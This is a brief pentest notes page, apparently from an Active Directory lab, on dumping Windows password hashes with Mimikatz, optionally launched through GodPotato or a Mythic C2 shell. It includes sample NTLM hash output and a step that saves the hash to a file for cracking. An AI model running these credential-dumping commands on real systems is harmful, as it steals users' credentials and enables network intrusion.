To dump the HAShes using Mimikatz, run the following:
```
Mimikatz.exe privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit
```

OR when using GodPotato:
```
GodPotato-NET4.exe -cmd "c:\Windows\TEMP\Mimikatz.exe privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit"
```

Using Mythic C2C Server:
```
shell c:\Windows\Temp\GodPotato-NET4.exe -cmd "c:\Windows\TEMP\Mimikatz.exe privilege::debug token::elevate lsadump::sam sekurlsa::logonpasswords exit"
```

Example output:
```
Authentication Id : 0 ; 297337 (00000000:00048979)
Session           : RemoteInteractive from 2
User Name         : robb.stark
Domain            : NORTH
Logon Server      : WINTERFELL
Logon Time        : 7/1/2026 5:12:31 PM
SID               : S-1-5-21-1968006588-2898582325-1577554485-1113
	msv :	
	 [00000003] Primary
	 * Username : robb.stark
	 * Domain   : NORTH
	 * NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
	 * SHA1     : 3bea28f1c440eed7be7d423cefebb50322ed7b6c
	 * DPAPI    : 13ae251f80e8c9f0e85395eea8c61dc5
	tspkg :	
	wdigest :	
	 * Username : robb.stark
	 * Domain   : NORTH
	 * Password : (null)
	kerberos :	
	 * Username : robb.stark
	 * Domain   : NORTH.SEVENKINGDOMS.LOCAL
	 * Password : (null)
	ssp :	
	credman :
```

Here you have the user "robb.stark" from the domain "NORTH" with the HASH of "831486ac7f26860c9e2f51ac91e1a07a"

You can copy that into a file to be cracked:
```
vi cred
robb.stark:831486ac7f26860c9e2f51ac91e1a07a
```

Next you can use Bloodhound to enumerate using the user and HASHes...
Check ou "Tool Uage > Bloodhound"